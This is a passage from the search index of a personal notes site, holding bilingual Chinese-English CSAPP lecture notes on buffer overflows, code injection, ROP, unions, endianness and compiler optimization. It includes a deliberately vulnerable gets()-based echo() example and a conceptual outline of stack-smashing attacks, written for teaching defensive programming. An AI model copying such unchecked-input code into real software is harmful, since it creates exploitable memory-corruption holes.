</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L09-Machine-Level-Programming-V-Advanced-Topics/#_1","title":"\u7f13\u51b2\u533a\u6ea2\u51fa","text":"<p>\u4e00\u822c\u79f0\u4f5c\u7f13\u51b2\u533a\u6ea2\u51fa Generally called a \"buffer overflow\"</p> <p>\u200b   \u5f53\u8d85\u8fc7\u4e86\u4e3a\u6570\u7ec4\u5206\u914d\u7684\u5185\u5b58\u5927\u5c0f\u65f6 when exceeding the memory size allocated for an array</p> <p>\u4e3a\u4ec0\u4e48\u5f88\u4e25\u91cd\uff1f Why a big deal?</p> <p>\u200b   \u8fd9\u662f\u7b2c\u4e00\u6280\u672f\u6f0f\u6d1e It's the #1 technical cause of security vulnerability</p> <p>\u200b       \u5728\u6240\u6709\u8d77\u56e0\u4e2d\u7b2c\u4e00\u7684\u65f6\u793e\u4f1a\u5de5\u7a0b/\u7528\u6237\u5ffd\u7565 #1 overall cause is social engineering / user ignorance</p> <p>\u6700\u5e38\u89c1\u7684\u5f62\u5f0f Most common form</p> <p>\u200b   \u672a\u68c0\u67e5\u5b57\u7b26\u4e32\u8f93\u5165\u7684\u957f\u5ea6 Unchecked lengths on string inputs</p> <p>\u200b   \u90e8\u5206\u662f\u56e0\u4e3a\u6808\u4e0a\u6709\u754c\u5b57\u7b26\u6570\u7ec4 Particularity for bounded character arrays on the stack</p> <p>\u200b       sometimes referred to as stack smashing </p> <p>\u5b57\u7b26\u4e32\u5e93\u4ee3\u7801 String Library Code</p> <p>Unix \u4e2d\u51fd\u6570 <code>gets()</code> \u7684\u5b9e\u73b0 Implementation of Unix function <code>gets()</code></p> <pre><code>/* Get string form stdin */\nchar *gets(char *dest) {\n    int c = getchar();\n    char *p = dest;\n    while (c != EOF &amp;&amp; c != '\\n') {\n        *p++ = c;\n        c = getchar();\n    }\n    *p = '\\0';\n    return dest;\n}\n</code></pre> <p>\u4e0d\u53bb\u7279\u6b8a\u5730\u9650\u5236\u8bfb\u5165\u5b57\u7b26\u6570\u91cf No way to specify limit on number of characters to read</p> <p>\u5176\u4ed6\u5e93\u51fd\u6570\u4e5f\u6709\u7c7b\u4f3c\u95ee\u9898 Similar problems with other library functions</p> <p>\u200b   <code>strcpy()</code>\u3001<code>strcat()</code>\uff1a\u590d\u5236\u4e00\u5b9a\u957f\u5ea6\u7684\u5b57\u7b26\u4e32 Copy strings of arbitrary length</p> <p>\u200b   <code>scanf()</code>\u3001<code>fscanf()</code>\u3001<code>sscanf()</code>\uff0c\u7279\u522b\u662f\u4f7f\u7528 <code>%s</code> \u65f6 when given <code>%s</code> conversion specifically.</p> <p>\u6709\u6f0f\u6d1e\u7684\u7f13\u51b2\u533a\u4ee3\u7801 Vulnerable Buffer Code</p> <pre><code>/* Echo Line */\nvoid echo() {\n    char buf[4];  /* Way too small! */\n    gets(buf);\n    puts(buf);\n}\nvoid call_echo() {\n    echo();\n}\n</code></pre> <pre><code>unix&gt;./bufdemo-nsp\nType a string:012345678901234567890123\n</code></pre> <p>\u7f13\u51b2\u533a\u6ea2\u51fa\u53cd\u7f16\u8bd1 Buffer Overflow Disassembly</p> <pre><code>0000 0000 0040 06cf &lt;echo&gt;:\n  4006cf: 48 83 ec 18        sub     $0x18,%rsp\n  4006d3: 48 89 e7           mov     %rsp,%rdi\n  4006d6: e8 a5 ff ff ff     callq   400680 &lt;gets&gt;\n  4006db: 48 89 e7           mov     %rsp,%rdi\n  4006de: e8 3d fe ff ff     callq   400520 &lt;puts@plt&gt;\n  4006e3: 48 83 c4 18        add     $0x18,%rsp\n  4006e7: c3                 retq\n</code></pre> <p><code>call_echo()</code>\uff1a</p> <pre><code>  4006e8: 48 83 ec 08        sub     $0x8,%rsp\n  4006ec: b8 00 00 00 00     mov     $0x0,%eax\n  4006f1: e8 d9 ff ff ff     callq   4006cf &lt;echo&gt;\n  4006f6: 48 83 c4 08        add     $0x8,%rsp\n  4006fa: c3                 retq\n</code></pre> <p>\u7f13\u51b2\u533a\u6ea2\u51fa\u5230\u6808 Buffer Overflow Stack</p> <pre><code>--------------------- \n|    Stack Frame    |\n|   for call_echo   |   \n|                   |   \n|                   |  \n--------------------- \n|  Return Address   |\n|     (8 Bytes)     |\n---------------------\n|  20 Bytes Unused  |\n|                   |\n---------------------\n|  [3]|[2]|[1]|[0]  | buf &lt;- %rsp\n---------------------\n</code></pre> <p>\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u6211\u4eec\u8f93\u5165 23 \u4e2a\u5b57\u7b26\uff0c\u6070\u597d\u4e0d\u8d8a\u754c\uff08\u5b57\u7b26\u4e32\u7ed3\u5c3e\u81ea\u5e26\u503c\u4e3a 00 \u7684 <code>\\0</code> \u5b57\u7b26\uff09\uff0c\u7528\u5149\u4e86\u6574\u4e2a\u7f13\u51b2\u533a\u3002</p> <p>\u518d\u52a0\uff0c\u5219\u4f1a\u6ea2\u51fa\u5230\u8fd4\u56de\u5730\u5740\u533a\u57df\uff0c\u5e76\u5f15\u53d1\u6bb5\u9519\u8bef\uff08segmentation fault\uff09\u3010\u5f53\u8bd5\u56fe\u8bbf\u95ee\u4e0d\u88ab\u5141\u8bb8\u8bbf\u95ee\u7684\u5185\u5b58\u533a\u57df\u5c31\u4f1a\u6bb5\u9519\u8bef\u3011</p> <p>\u4ee3\u7801\u6ce8\u5165\u653b\u51fb Code Injection Attacks</p> <pre><code>void P() {\n    Q();\n    ...   // &lt;- return address\n}\nint Q() {\n    char buf[64];\n    gets(buf);\n    ...\n    return ...;\n}\n</code></pre> <pre><code>---------------------  ---\n|                   |   ^\n|                   |   |\n|                   |   P stack frame\n---------------------   |---\n|         B         |   v ^\n---------------------  ---|--- \n|        pad        |     | ^\n|                   |     da|ta written by gets()\n---------------------     | |\n|      exploit      |     v Q stack frame\n|       code        | &lt;--B- |\n---------------------       |\n|                   |       v\n---------------------      ---\n</code></pre> <p>\u6362\u53e5\u8bdd\u8bf4\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u8f93\u5165\u7279\u5b9a\u5b57\u7b26\u4e32\uff0c\u5c06\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u7be1\u6539\u4e86\uff0c\u4ece\u800c\u52ab\u6301\u4e86\u7a0b\u5e8f\u8fd0\u884c\u7684\u63a7\u5236\u6743\uff0c\u8fdb\u800c\u6267\u884c\u4efb\u4f55\u8be5\u63a7\u5236\u6743\u53ef\u4ee5\u6267\u884c\u7684\u547d\u4ee4\uff08\u5373\u6267\u884c\u6ce8\u5165\u7684\u4ee3\u7801\uff09\uff0c\u5f53\u8fd9\u4e2a\u547d\u4ee4\u4e3a\u6700\u9ad8\u6743\u9650\u65f6\uff0c\u653b\u51fb\u8005\u5c31\u5b8c\u5168\u638c\u63e1\u4e86\u8fd9\u4e2a\u673a\u5668\u3002\u3010\u6b64\u4e8b\u5728 NAD pwn \u4e2d\u4ea6\u6709\u8bb0\u8f7d\u3011</p> <p>Input string contains byte representation of executable code</p> <p>Overwrite return address A with address of buffer B</p> <p>When <code>Q()</code> executes <code>ret</code>, will jump to exploit code.</p> <p>\u4ee3\u7801\u6ce8\u5165\u653b\u51fb\u66fe\u7ecf\u662f\u4e00\u4e2a\u76f8\u5f53\u5927\u7684\u95ee\u9898\uff08\u4f60\u770b\u8fd9\u4e9b\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u5e93\u51fd\u6570\u968f\u968f\u4fbf\u4fbf\u62c9\u51fa\u6765\u4e00\u4e2a\u90fd\u6709\u8fd9\u6f0f\u6d1e\uff09\uff0c1988 \u5e74\uff0c\u7b2c\u4e00\u4e2a\u4e92\u8054\u7f51\u653b\u51fb\u88ab\u79f0\u4e3a\u300c\u83ab\u91cc\u65af\u8815\u866b\u300d\uff08the Morris worm\uff09\uff0c\u5f53\u65f6\u4e92\u8054\u7f51\u89c4\u6a21\u8fd8\u6bd4\u8f83\u5c0f\uff0c\u6240\u4ee5\u5b83\u57fa\u672c\u4e0a\u611f\u67d3\u4e86\u5f53\u65f6\u4e92\u8054\u7f51\u4e0a\u5927\u90e8\u5206\u673a\u5668\uff08\u7b11\u70b9\u89e3\u6790\uff1aMIT6.824 \u5206\u5e03\u5f0f\u7cfb\u7edf\u7684\u8bfe\u7a0b\u7684\u4f5c\u8005\u5c31\u662f\u8be5\u75c5\u6bd2\u7684\u4f5c\u8005\uff09</p> <p>\u57fa\u4e8e\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u653b\u51fb Exploits Based on Buffer Overflows</p> <p>\u200b   \u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\u80fd\u8ba9\u8fdc\u7aef\u673a\u5668\u5728\u53d7\u5bb3\u673a\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4 Buffer overflow bugs can allow remote machines to execute arbitrary code on victim machines</p> <p>\u200b   Distressingly common in real programs</p> <p>\u200b       Programmers keep making the same mistakes.</p> <p>\u200b       Recent measures make these attacks much more difficult</p> <p>\u200b   Examples across the decades</p> <p>\u200b       Original \"Internet worm\" (1988)</p> <p>\u200b       \"IM wars\" (1999)</p> <p>\u200b       Twilight hack on Wii (2000s)</p> <p>\u200b       ... and many, many more</p> <p>\u200b   You will learn some of the tricks in attack lab</p> <p>\u200b       Hopefully to convince you to never leave such holes in your programs.</p> <p>Example: the original Internet worm (1988)</p> <p>\u200b   Exploit a few vulnerability to spread</p> <p>\u200b       Early versions of the finger server (fingered) used <code>gets()</code> to read the argument sent by the client.</p> <p>\u200b           <code>finger droh @cs.cmu.edu</code> \u3010\u73b0\u5728\u88ab\u5e7f\u6cdb\u7981\u7528\u7684 <code>finger</code> \u547d\u4ee4\uff0c\u7528\u4e8e\u5411\u8fdc\u7aef\u673a\u5668\u53d1\u9001\u6d88\u606f\u3011</p> <p>\u200b       Worm attacked fingered server by sending phony argument:</p> <p>\u200b           <code>finger \"exploit-code padding new-returen-address\"</code></p> <p>\u200b           exploit code: executed a root shell on the victim machine with a direct TCP connection to the attacker</p> <p>\u200b   Once on a machine, scanned for other machines to attack</p> <p>\u200b       invaded about 6000 computers in hours (10% of the Internet)</p> <p>\u200b           see June 1989 article in Comm. of the ACM</p> <p>\u200b       the young author of the worm was prosecuted...</p> <p>\u200b       and CERT was formed... still homed at CMU</p> <p>Example 2: IM War</p> <p>\u200b   July, 1999</p> <p>\u200b       Microsoft launches MSN Messenger (instant messaging system)</p> <p>\u200b       Messenger clients can access popular AOL Instant Messaging Service (AIM) servers</p> <pre><code>                              AIM client\n                                    ^\n                                    |\n                                    v \nMSN server &lt;-&gt; MSN client &lt;-&gt; AIM server\n                                    ^\n                                    |\n                                    V\n                              AIM client\n</code></pre> <pre><code>August, 1999\n</code></pre> <p>\u200b       Mysteriously, Messenger clients can no longer access AIM servers</p> <p>\u200b       Microsoft and AOL begin the IM war:</p> <p>\u200b           AOL changes server to disallow Messenger clients</p> <p>\u200b           Microsoft makes changes to clients to defeat AOL changes</p> <p>\u200b           At least 13 such skirmishes</p> <p>\u200b       What was really happening?</p> <p>\u200b           AOL had discovered a buffer overflow bug in their own AIM clients</p> <p>\u200b           They exploited it to detect and block Microsoft: the exploit code returned a 4-byte signature (the bytes at some location in the AIM client to server)</p> <p>\u200b           When Microsoft changed code to match signature, AOL changes signature location</p> <p>AOL \u5229\u7528\u6f0f\u6d1e\u5077\u4fe1\u606f\u8fd9\u4ef6\u4e8b\u88ab\u4e00\u4e2a\u81ea\u79f0\u4e3a Phil Bucking \u7684\u4eba\u62ab\u9732\uff0c\u540e\u6765\u786e\u8ba4\u8fd9\u5c01\u90ae\u4ef6\u662f\u4ece\u5fae\u8f6f\u5185\u90e8\u53d1\u51fa\u7684\u3002</p> <p>\u5f02\u540c\uff1a\u8815\u866b\u548c\u75c5\u6bd2 Aside: Worms and Viruses</p> <p>\u200b   \u8815\u866b\uff1a\u4e00\u6bb5\u8fd9\u6837\u7684\u7a0b\u5e8f Worm: A program that </p> <p>\u200b       \u53ef\u4ee5\u81ea\u884c\u8fd0\u884c Can run by itself</p> <p>\u200b       \u53ef\u4ee5\u4f20\u64ad\u4e00\u4e2a\u81ea\u5df1\u7684\u53ef\u5de5\u4f5c\u7248\u672c\u5230\u5176\u4ed6\u8ba1\u7b97\u673a\u4e0a Can propagate a fully working version of itself to other computers.</p> <p>\u200b   \u75c5\u6bd2\uff1a\u8fd9\u6837\u7684\u4ee3\u7801 Virus: Code that</p> <p>\u200b       \u5c06\u81ea\u5df1\u6dfb\u52a0\u5230\u5176\u4ed6\u7a0b\u5e8f\u5f53\u4e2d Adds itself to other programs</p> <p>\u200b       \u65e0\u6cd5\u72ec\u7acb\u8fd0\u884c Does not run independently</p> <p>\u200b   \u4e24\u8005\u90fd\uff08\u901a\u5e38\uff09\u88ab\u8bbe\u8ba1\u51fa\u6765\u5728\u8ba1\u7b97\u673a\u4e4b\u95f4\u4f20\u64ad\uff0c\u5e76\u4e14\u5927\u8086\u7834\u574f Both are (usually) designed to spread among computers and to wreak havoc.</p> <p>\u5982\u4f55\u5904\u7406\u7f13\u51b2\u533a\u6ea2\u51fa OK, what to do about buffer overflow attacks</p> <p>\u200b   1. \u907f\u514d\u6ea2\u51fa\u6f0f\u6d1e Avoid overflow vulnerabilities</p> <p>\u200b   2. \u5229\u7528\u7cfb\u7edf\u7ea7\u522b\u9632\u62a4 Employ system-level protections</p> <p>\u200b   3. \u7f16\u8bd1\u5668\u5728\u6808\u4e0a\u4f7f\u7528\u300c\u91d1\u4e1d\u96c0\u300dHave compiler use \"stack canaries\"\u3010\u91d1\u4e1d\u96c0\u662f\u4e00\u4e2a\u5e38\u7528\u6bd4\u55bb\uff0c\u4ee5\u524d\u77ff\u5de5\u4e0b\u7164\u77ff\uff0c\u4f1a\u5e26\u4e00\u53ea\u91d1\u4e1d\u96c0\u7b49\u8106\u5f31\u52a8\u7269\u6765\u63a2\u6d4b\u77ff\u6d1e\u5185\u6c14\u4f53\u6210\u5206\u53d8\u5316\uff0c\u4eba\u65e0\u6cd5\u5bdf\u89c9\u51fa\u6765\u7684\u6c14\u4f53\u6210\u5206\u53d8\u5316\u80fd\u591f\u88ab\u5b83\u4eec\u5bdf\u89c9\u5230\uff0c\u56e0\u6b64\u91d1\u4e1d\u96c0\u7528\u4e8e\u6bd4\u55bb\u654f\u611f\u7684\u63a2\u6d4b\u5668\u3002\u3011</p> <p>\u200b   Lets talk about each...</p> <ol> <li>\u907f\u514d\u6ea2\u51fa\u6f0f\u6d1e</li> </ol> <pre><code>/* Echo Line */\nvoid echo() {\n    char buf[4]; /* Way too small! */\n    fgets(buf, 4, stdin);\n    puts(buf);\n}\n</code></pre> <p>\u4f8b\u5982\uff0c\u4f7f\u7528\u9650\u5236\u5b57\u7b26\u4e32\u957f\u5ea6\u7684\u5e93\u51fd\u6570 For example, use library routines that limit string lengths</p> <p>\u200b   \u4f7f\u7528 <code>fgets()</code> \u800c\u4e0d\u662f <code>gets()</code> <code>fgets</code> instead of <code>gets</code></p> <p>\u200b   \u4f7f\u7528 <code>strncpy</code> \u800c\u4e0d\u662f <code>strcpy</code> <code>strncpy</code> instead of <code>strcpy</code></p> <p>\u200b   \u4e0d\u8981\u4f7f\u7528\u5e26 <code>%s</code> \u7684 <code>scanf()</code>  Don't use <code>scanf</code> with <code>%s</code> conversion specification</p> <p>\u200b       \u4f7f\u7528 <code>fgets()</code> \u51fd\u6570\u6765\u8bfb\u5165\u5b57\u7b26\u4e32 Use <code>fgets</code> to read the string</p> <p>\u200b       \u6216\u8005\u4f7f\u7528 <code>%ns</code>\uff0c\u5176\u4e2d <code>n</code> \u662f\u4e00\u4e2a\u5408\u9002\u7684\u6574\u6570 Or use <code>%ns</code> where <code>n</code> is a suitable integer.</p> <ol> <li>\u7cfb\u7edf\u7ea7\u522b\u9632\u62a4 System-Level Protection can help</li> </ol> <p>\u200b   \u968f\u673a\u6808\u504f\u79fb Randomized stack offsets\u3010\u8fd9\u79cd\u6280\u672f\u4e5f\u88ab\u79f0\u4e3a\u300c\u5730\u5740\u7a7a\u95f4\u5e03\u5c40\u968f\u673a\u5316\u300dASLR, address space layout randomization\u3011</p> <p>\u200b       At start of program, allocate random amount of space on stack</p> <p>\u200b       Shifts stack addresses for entire program</p> <p>\u200b       Makes it difficult for hacker to predict beginning of inserted code</p> <p>\u200b       e.g. 5 executions of memory allocation code</p> <p>\u200b           stack repositioned each time program executes</p> <p>\u200b   \u4e0d\u53ef\u6267\u884c\u4ee3\u7801\u6bb5 Nonexecutable code segments</p> <p>\u200b       In traditional x86, can mark region of memory as either \"read-only\" or \"writeable\"</p> <p>\u200b           Can execute anything readable</p> <p>\u200b       x86-64 added explicit \"execute\" permission\u3010\u8fd9\u9010\u6e10\u6f14\u5316\u6210\u4e86 3 \u4f4d\u7684\u8bfb\u5199\u6267\u6743\u9650\u7801\u3011</p> <p>\u200b       stack marked as nonexecutable</p> <ol> <li>\u4f7f\u7528\u91d1\u4e1d\u96c0 Stack Canaries can help</li> </ol> <p>\u200b   Idea</p> <p>\u200b       Place special value (\"canary\") on stack just beyond buffer </p> <p>\u200b       Check for corruption before exiting function</p> <p>\u200b   GCC Implementation</p> <p>\u200b       <code>-fstack-pretector</code></p> <p>\u200b       Now the default (disabled earlier)</p> <pre><code>unix&gt;./bufdemo-sp\nType a string:0123456\n0123456\n\nunix&gt;./bufdemo-sp\nType a string:01234567\n*** stack smashing detected ***\n</code></pre> <p>\u53d7\u4fdd\u62a4\u7684\u7f13\u51b2\u533a\u53cd\u7f16\u8bd1 Protected Buffer DIsassembly</p> <p>echo:</p> <pre><code>  40072f: sub     $0x18,%rsp \n  400733: mov     %fs:0x28,%rax                  #\n  40073c: mov     %rax,0x8(%rsp)                 #\n  400741: xor     %eax,%eax\n  400743: mov     %rsp,%rdi\n  400746: callq   4006e0 &lt;gets&gt;\n  40074b: mov     %rsp,%rdi\n  40074e: callq   400570 &lt;puts@plt&gt;\n  400753: mov     0x8(%rsp),%rax                 #\n  400758: xor     %fs:0x28,%rax                  #\n  400761: je      400768 &lt;echo+0x39&gt;\n  400763: callq   400580 &lt;__stack_chk_fail@plt&gt;  #\n  400768: add     $0x18,%rsp\n  40076c: retq\n</code></pre> <p>\u9488\u5bf9\u4ee5\u4e0a\u5e38\u89c1\u4fdd\u62a4\u63aa\u65bd\uff0c\u53c8\u6709\u4e86\u65b0\u7684\u653b\u51fb\u624b\u6bb5\uff0c\u5176\u88ab\u79f0\u4e3a\u9762\u5411\u8fd4\u56de\u7f16\u7a0b\uff08return oriented programming\uff09\uff0c\u6210\u529f\u7387\u53ef\u89c2\u3002\u524d\u4e24\u79cd\u90fd\u53ef\u4ee5\u6bd4\u8f83\u8f7b\u6613\u5730\u7834\u89e3\uff0c\u91d1\u4e1d\u96c0\u6bd4\u8f83\u96be\u3002</p> <p>Return-Oriented Programming Attacks</p> <p>\u200b   Challenge (for hackers)</p> <p>\u200b       Stack randomization makes it hard to predict buffer location</p> <p>\u200b       Marking stack nonexecutable makes it hard to insert binary code</p> <p>\u200b   Alternative Strategy</p> <p>\u200b       Use existing code</p> <p>\u200b           e.g. library code from stdlib</p> <p>\u200b       string together fragments to achieve overall desired outcome</p> <p>\u200b       Does not over come stack canaries</p> <p>\u200b   Construct program from gadgets \uff08gadget \u6307\u90e8\u5206\u53ef\u6267\u884c\u7a0b\u5e8f\u7684\u4e00\u7cfb\u5217\u5b57\u8282\uff09</p> <p>\u200b       Sequence of instructions ending in <code>ret</code></p> <p>\u200b           Encoded by single byte <code>0xc3</code></p> <p>\u200b       Code positions fixed from run to run</p> <p>\u200b       Code is executable </p> <p>\u3010\u9762\u5411\u8fd4\u56de\u7f16\u7a0b\u5c31\u662f\u5229\u7528 gadget\uff0cgadget \u5229\u7528\u5404\u4e2a\u53ef\u6267\u884c\u4ee3\u7801\u4e2d <code>ret</code> \u53ca\u524d\u9762\u7684\u4e00\u90e8\u5206\u4ee3\u7801\uff0c\u56e0\u4e3a\u8fd4\u56de\u5730\u5740\u53ef\u4ee5\u5f97\u77e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u7f13\u51b2\u533a\u6ea2\u51fa\u8df3\u8f6c\u5230\u8fd9\u4e9b\u5730\u65b9\uff0c\u7136\u540e\u6bcf\u5230\u4e00\u4e2a\u5730\u65b9\u6267\u884c\u4e00\u90e8\u5206\u4ee3\u7801\u540e\u8fd4\u56de\uff0c\u8fd9\u4e2a\u8fd4\u56de\u53c8\u8df3\u8f6c\u5230\u4e0b\u4e00\u4e2a gadget \u5904\uff0c\u7531\u6b64\u62fc\u51d1\u51fa\u4e86\u53ef\u4ee5\u5b8c\u6210\u76ee\u6807\u7684\u6307\u4ee4\u5e8f\u5217\u3002\u3011</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L09-Machine-Level-Programming-V-Advanced-Topics/#_2","title":"\u8054\u5408\u4f53","text":"<p>\u8054\u5408\u4f53\u5185\u5b58\u5206\u914d</p> <p>\u6839\u636e\u6700\u5927\u5143\u7d20\u5206\u914d\uff0c\u4e00\u6b21\u53ea\u80fd\u4f7f\u7528\u4e00\u4e2a\u5b57\u6bb5 Allocate according to largest element. Can only use one field at a time.</p> <pre><code>union U1 {\n    char c;\n    int i[2];\n    double v;\n} *up;\nstruct S1 {\n    char c;\n    int i[2];\n    double v;\n} *sp;\n</code></pre> <pre><code>---\n|c|\n--+--+-----\n|i[0]|i[1]|\n-----+-----\n|v        |\n-----------\nup+0      up+8\n\n-----+----+----+----+---------\n|c\\3B|i[0]|i[1]\\4B  |v       |\n-----+----+----+----+---------\nsp+0 sp+4 sp+8 sp+12sp+16    sp+24\n</code></pre> <pre><code>typedef union {\n    float f;\n    unsigned u;\n} bit_float_t;\n\nfloat bit2float(unsigned u) {\n    bit_float_t arg;\n    arg.u = u;\n    return arg.f;\n}\nunsigned float2bit(float f) {\n    bit_float_t arg;\n    arg.f = f;\n    return arg.u;\n} \n// \u6b64\u5904 u \u548c f \u7684\u7a7a\u95f4\u5b8c\u5168\u91cd\u53e0\u3002\n</code></pre> <p>Byte Ordering Revisited</p> <p>\u200b   Idea </p> <p>\u200b       Short/long/quad words stored in memory as 2/4/8 consecutive bytes</p> <p>\u200b       Which byte is most (least) significant?</p> <p>\u200b       Can cause problems when exchanging binary data between machines</p> <p>\u200b   \u5927\u7aef\u65b9\u5f0f Big Endian </p> <p>\u200b       Most significant byte has lowest address </p> <p>\u200b       Sparc</p> <p>\u200b   \u5c0f\u7aef\u65b9\u5f0f Little Endian</p> <p>\u200b       Least significant byte has lowest address</p> <p>\u200b       Intel x86, ARM Android and IOS</p> <p>\u200b   \u53cc\u7aef\u65b9\u5f0f Bi Endian</p> <p>\u200b       Can be configured either way</p> <p>\u200b       ARM</p> <p>\u8054\u5408\u4f53\u6700\u521d\u662f\u7528\u6765\u89e3\u51b3\u5b57\u8282\u5e8f\u5217\u5207\u6362\u95ee\u9898\u7684\uff0c\u8ba9\u6570\u636e\u5728\u5927\u7aef\u5c0f\u7aef\u4e4b\u95f4\u5207\u6362\u3002</p> <p>IA32 \u4f7f\u7528\u5c0f\u7aef\uff0cSun \u4f7f\u7528\u5927\u7aef\uff0cx86-64 \u4f7f\u7528\u5c0f\u7aef\uff0c\u603b\u4e4b\u73b0\u5728\u5927\u591a\u6570\u673a\u5668\u90fd\u662f\u5c0f\u7aef</p> <p>Summary of Compound Types in  C</p> <p>\u200b   Arrays</p> <p>\u200b       Contiguous allocation of memory</p> <p>\u200b       Aligned to satisfy every element's alignment requirement</p> <p>\u200b       Pointer to first element</p> <p>\u200b       No bounds checking</p> <p>\u200b   Structures </p> <p>\u200b       Allocate bytes in order declared</p> <p>\u200b       Pad in middle and at end to satisfy alignment</p> <p>\u200b   Unions</p> <p>\u200b       Overlay declaration</p> <p>\u200b       Way to circumvent type system</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L10-Program-Optimization/","title":"L10 Program Optimization","text":"<p>Source: https://www.bilibili.com/video/BV1iW411d7hd?p=10</p> <p>Today</p> <p>\u200b   \u9884\u89c8 Overview</p> <p>\u200b   \u901a\u7528\u6709\u7528\u7684\u4f18\u5316\u65b9\u6cd5 Generally Useful Optimizations</p> <p>\u200b       \u6307\u4ee4\u79fb\u52a8/\u9884\u8ba1\u7b97 Code motion/precomputation</p> <p>\u200b       \u51cf\u5c11\u8ba1\u7b97\u91cf Strength reduction</p> <p>\u200b       \u5171\u7528\u5b50\u8868\u8fbe\u5f0f Sharing of common subexpressions</p> <p>\u200b       \u53bb\u9664\u4e0d\u5fc5\u8981\u7684\u8fc7\u7a0b\u8c03\u7528 Removing unnecessary procedure calls</p> <p>\u200b   \u4f18\u5316\u7684\u969c\u788d Optimization Blockers</p> <p>\u200b       \u8fc7\u7a0b\u8c03\u7528 Procedure calls</p> <p>\u200b       \u5185\u5b58\u522b\u540d Memory aliasing</p> <p>\u200b   \u5229\u7528\u6307\u4ee4\u7ea7\u5e76\u884c Exploiting Instruction-Level Parallelism</p> <p>\u200b   \u5904\u7406\u6761\u4ef6\u5224\u65ad Dealing with Conditionals</p> <p>\u8868\u73b0\u7684\u73b0\u5b9e Performance Realities</p> <p>\u200b   There's more to performance than asymptotic complexity</p> <p>\u200b   \u5e38\u6570\u56e0\u5b50\u4e5f\u5f88\u91cd\u8981\uff01Constant factors matter too!</p> <p>\u200b       Easy see 10:1 performance range depending on how code is written </p> <p>\u200b       Must optimize at multiple levels</p> <p>\u200b           algorithm, data representations, procedures, and loops</p> <p>\u200b   Must understand system to optimize performance</p> <p>\u200b       How programs are compiled and executed</p> <p>\u200b       How modern processors + memory systems operate</p> <p>\u200b       How to measure program performance and identify bottlenecks</p> <p>\u200b       How to improve performance without destroying code modular generality</p> <p>Optimizing compilers</p> <p>\u200b   Provide efficient mapping of program to machine</p> <p>\u200b       register allocation</p> <p>\u200b       code selection and ordering (scheduling)</p> <p>\u200b       dead code elimination</p> <p>\u200b       eliminating minor inefficiencies</p> <p>\u200b   Don't (usually) improve asymptotic efficiency</p> <p>\u200b       up to programmer to select best overall algorithm</p> <p>\u200b       big-O savings are (often) more important than constant factors</p> <p>\u200b           but constant factors also matter</p> <p>\u200b   Have difficulty overcoming \"optimization blockers\"</p> <p>\u200b       potential memory aliasing</p> <p>\u200b       potential procedure side-effects</p> <p>Limitations of Optimizing Compilers</p> <p>\u200b   Operate under fundamental constraint</p> <p>\u200b       Must not cause any change in program behavior</p> <p>\u200b           Except, possibly when program making use of nonstandard language features</p> <p>\u200b       Often prevents it from making optimizations that would only affect behavior under pathological conditions</p> <p>\u200b   Behavior that may be obvious to the programmer can be obfuscated by languages and coding styles</p> <p>\u200b       e.g. Data ranges may be more limited than variable types suggest</p> <p>\u200b   Most analysis is performed only within procedures</p> <p>\u200b       Whole-program analysis is too expensive in most cases</p> <p>\u200b       Newer versions of GCC do interprocedural analysis within individual files </p> <p>\u200b           But, not between code in different files</p> <p>\u200b   Most analysis is based only on static information</p> <p>\u200b       Compiler has difficult anticipating run-time inputs</p> <p>\u200b   When in doubt, the compiler must be conservative </p>"},{"location":"out_class_learning/freely_learning/CSAPP/L10-Program-Optimization/#_1","title":"\u901a\u7528\u6709\u7528\u7684\u4f18\u5316\u65b9\u6cd5","text":"<p>\u200b   \u65e0\u8bba\u4ec0\u4e48\u5904\u7406\u5668\u548c\u7f16\u8bd1\u5668\uff0c\u65e0\u8bba\u662f\u4f60\u8fd8\u662f\u7f16\u8bd1\u5668\u90fd\u5e94\u8be5\u505a\u7684</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L10-Program-Optimization/#code-motion","title":"\u4ee3\u7801\u79fb\u52a8 Code Motion","text":"<p>\u200b   Reduce frequency with which computation performed</p> <p>\u200b       If it will always produce same result</p> <p>\u200b       Especially moving code out of loop</p> <pre><code>void set_row(double *a, double *b, long i, long n) {\n    long j;\n    for (j = 0; j &lt; n; j++)\n        a[n*i+j] = b[j]\n}\n</code></pre> <pre><code>void set_row(double *a, double *b, long i, long n) {\n    long j;\n    int ni = n*i;\n    for (j = 0; j &lt; n; j++)\n        a[ni+j] = b[j]\n}\n</code></pre> <pre><code>set_row:\n    testq   %rcx, %rcx           # Test n\n    jle     .L1                  # If , go to done\n    imulq   %rcx, %rdx           # ni = n*i\n    leaq    (%rdi,%rdx,8), %rdx  # rowp = A + ni*8\n    movl    $0, %eax             # j = 0\n.L3:                             # loop:\n    movsd   (%rsi,%rax,8), %xmm0 # t = b[j]\n    movsd   %xmm0, (%rdx,%rax,8) # *rowp = t\n    addq    $1, %rax             # j++\n    cmpq    %rcx, %rax           # j:n\n    jne     .L3                  # if !=, goto loop\n.L1:                             # done:\n    rep; ret\n</code></pre>"},{"location":"out_class_learning/freely_learning/CSAPP/L10-Program-Optimization/#reduction-in-strength","title":"\u51cf\u5c11\u8ba1\u7b97\u91cf Reduction in Strength","text":"<p>\u200b   Replace costly operation with simpler one</p> <p>\u200b   Shift, and instead of multiply or divide</p> <p>\u200b       <code>16 * x --&gt; x &lt;&lt; 4</code></p> <p>\u200b       Utility machine dependent</p> <p>\u200b       Depends on cost of multiply or divide instruction</p> <p>\u200b           On Intel Nehalem, integer multiply requires 3 CPU cycles</p> <p>\u200b       Recognize sequence of products</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L10-Program-Optimization/#share-common-subexpressions","title":"\u5171\u7528\u5b50\u8868\u8fbe\u5f0f Share Common Subexpressions","text":"<p>\u200b   \u590d\u7528\u90e8\u5206\u8868\u8fbe\u5f0f Reuse portions of expressions</p> <p>\u200b   GCC will do this with <code>--O1</code></p> <pre><code>/* Sum neighbors of i,j */\nup =    val[(i-1)*n + j  ];\ndown =  val[(i+1)*n + j  ];\nleft =  val[i*n     + j-1];\nright = 